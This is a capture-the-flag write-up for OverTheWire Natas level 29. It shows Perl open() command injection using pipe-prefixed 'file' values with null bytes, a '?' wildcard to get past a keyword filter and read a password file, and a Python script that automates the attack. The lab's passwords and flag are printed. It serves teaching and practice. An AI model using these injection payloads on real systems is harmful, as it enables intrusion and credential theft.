# Natas Level 29 Writeup (natas29) – OverTheWire

## Overview

This level focuses on **Perl command injection**.  
The goal is to find the password for the next level.

## Observation

When we open the page, we see a dropdown containing different Perl Underground articles.

There is no source code link.

The page uses the `file` parameter:

```text
index.pl?file=perl+underground
```

## Finding the Password

### Using Browser & BurpSuite

1. First, try to inject a command using `|` and Capture request in BurpSuite `Repeater`:

    ```text
    |ls
    ```

    This does not work because the application adds `.txt` to the requested file.

2. We can use a **null byte** to stop the added extension:

    ```text
    |ls%00
    ```

3. Now the command executes and shows the files in the current directory.

4. We can also read the source code:

    ```text
    |cat%20index.pl%00
    ```

5. In the source code, we find:

    ```perl
    if(param('file')){
        $f=param('file');
        if($f=~/natas/){
            print "meeeeeep!<br>";
        }
        else{
            open(FD, "$f.txt");
            print "<pre>";
            while (<FD>){
                print CGI::escapeHTML($_);
            }
            print "</pre>";
        }
    }
    ```

6. The application blocks the string:

    ```text
    natas
    ```

7. We can bypass this filter by using `?` as a wildcard in the shell:

    ```text
    |cat+/etc/na?as_webpass/na?as30%00
    ```

8. The `?` matches the missing character, so the command accesses:

    ```text
    /etc/natas_webpass/natas30
    ```

9. The response contains the password for **natas30**.

#### Proof

```text
frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF
```

### Using Python

```python
import requests

target = 'http://natas29.natas.labs.overthewire.org'
auth = ('natas29', 'hwgoYUiGWoSZAqphtCAZf7u1jS16KEah')

# payload = '|ls'
# payload = '|ls\0'
# payload = '|cat index.pl\0'
payload = '|cat /etc/na?as_webpass/nat?s30\0'

r = requests.get(target, auth=auth, params={"file": payload})

print("Password for next level is:", r.text[-33:-1])
```

## Vulnerability

The application passes user input to Perl's `open()` function.

By starting the input with `|`, we can execute a command. The blacklist for `natas` can then be bypassed using `?`.

## Flag

`frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF`
